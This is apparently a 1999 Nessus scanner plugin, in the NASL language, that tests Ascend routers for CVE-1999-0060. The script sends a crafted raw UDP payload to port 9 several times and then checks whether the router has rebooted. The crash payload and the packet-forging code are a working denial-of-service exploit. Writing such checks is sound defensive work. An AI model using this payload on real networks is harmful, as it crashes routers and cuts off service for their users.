#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10019);
 script_bugtraq_id(714);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-1999-0060");
 name["english"] = "Ascend Kill";
 name["francais"] = "Ascend Kill";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to make
the remote Ascend router reboot by sending
it a UDP packet containing special data on
port 9 (discard).

An attacker may use this flaw to make your
router crash continuously, preventing
your network from working properly.

Solution : filter the incoming UDP traffic coming
to port 9. Contact Ascend for a solution.

Risk factor : High";

 desc["francais"] = "Il a été possible de faire
rebooter le server Ascend distant en lui envoyant
un paquet UDP contenant des données spéciales
sur le port 9 (discard).

Un pirate peut utiliser ce problème pour continuellement
faire rebooter votre routeur, empechant ainsi votre 
réseau de fonctionner correctement.

Solution : filtrez le traffic UDP entrant en direction
du port 9, contactez Ascend pour une solution.

Facteur de risque : Elevé";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes an ascend router";
 summary["francais"] = "Fait planter un routeur ascend";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 
 exit(0);
}

#
# The script code starts here
#

start_denial();
 
crash = raw_string(0x00, 0x00, 0x07, 0xa2, 0x08, 0x12, 0xcc, 0xfd, 0xa4, 
    0x81, 0x00, 0x00, 0x00, 0x00, 0x12, 0x34, 0x56, 0x78, 0xff, 0xff, 0xff, 
    0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 
    0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0x4e, 0x41, 0x4d, 0x45, 0xff, 0x50, 
    0x41, 0x53, 0x53, 0x57, 0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53, 0x57, 
    0x4f, 0x52, 0x44, 0x50, 0x41, 0x53, 0x53);

port = 9;
ip = forge_ip_packet(ip_hl: 5,	 	ip_v : 4,	ip_tos : 123,
		     ip_len : 80, 	ip_id:1234,	ip_off : 0,
		     ip_ttl : 0xff,	ip_p:IPPROTO_UDP,
		     ip_src : this_host());
udp = forge_udp_packet(ip:ip,
			uh_sport : 9,
			uh_dport : 9,
			uh_ulen  : 60,
			data:crash);

send_packet(udp, pcap_active:FALSE) x 10;
sleep(5);
alive = end_denial();					     
if(!alive){
  		security_hole(port, protocol:"udp");
		set_kb_item(name:"Host/dead", value:TRUE);
		}
 
